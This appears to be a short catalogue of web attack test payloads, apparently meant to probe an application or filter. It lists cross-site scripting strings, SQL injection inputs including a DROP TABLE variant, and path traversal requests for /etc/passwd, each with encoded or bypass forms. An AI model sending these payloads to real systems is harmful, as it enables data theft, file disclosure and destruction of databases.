XSS Attacks

  • basic /search?q=<script>alert(1)</script>
  • img /echo?msg=<img src=x onerror=alert(1)>
  • svg /profile?name=<svg onload=alert(1)>
  • event /comment?text=<div onmouseover=alert(1)>
  • href /redirect?url=javascript:alert(1)
  • encoded /search?q=%3Cscript%3Ealert(1)%3C/script%3E
  • double /echo?msg=%253Cscript%253E (double encoded)

SQL Injection

  • or 1=1 /api/items?id=1 OR 1=1
  • union /api/items?id=1 UNION SELECT...
  • quote /api/users?username=admin' OR '1'='1
  • comment /api/login?user=admin'--
  • order /api/comments?order=id;DROP TABLE
  • encoded /api/items?id=1%20OR%201%3D1
  • case /api/items?id=1 oR 1=1 (mixed case)

Path Traversal

  • basic /api/files?path=../app/main.py
  • etc /api/files?path=../../../etc/passwd
  • encoded /api/files?path=%2e%2e%2f (encoded)
  • double /api/files?path=....//....// (bypass)
  • download /api/download?file=../../../etc/passwd
  • include /api/include?page=../../../etc/passwd
